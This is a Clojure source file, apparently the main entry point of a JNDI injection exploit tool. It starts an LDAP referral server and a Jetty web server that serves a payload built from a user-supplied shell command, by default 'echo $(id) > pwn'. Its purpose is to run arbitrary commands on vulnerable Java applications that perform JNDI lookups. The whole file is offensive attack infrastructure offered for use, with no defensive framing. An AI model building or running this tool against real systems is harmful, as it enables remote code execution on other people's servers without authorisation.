(ns jndi-injector-clj.core
  (:gen-class)
  (:import [org.pwn
            Payload])
  (:require [ring.adapter.jetty :as jetty]
            [jndi-injector-clj.ldap :as ldap]
            [clojure.tools.cli :refer [parse-opts]]))

(defn gen-handler [payload]
  (fn [request]
    (println "[+] incoming request " (:uri request))
    {:status 200
     :body payload}))

(def cli-options
  [["-c" "--command COMMAND" "command to execute"
    :default "echo $(id) > pwn"]
   ["-p" "--port PORT" "webserver port"
    :default 3000
    :parse-fn #(Integer/parseInt %)
    :validate [#(< 0 % 0x10000) "Must be a number between 0 and 65536"]]
   ["-h" "--help"]])

(defn -main [& args]
  (let [options (:options (parse-opts args cli-options))
        port (:port options)
        url (str "http://localhost:" port "/")
        command (:command options)
        handler (gen-handler (Payload/build command))]
    (.start (Thread. (fn [] (ldap/start url "Pwned"))))
    (jetty/run-jetty handler {:port port})))
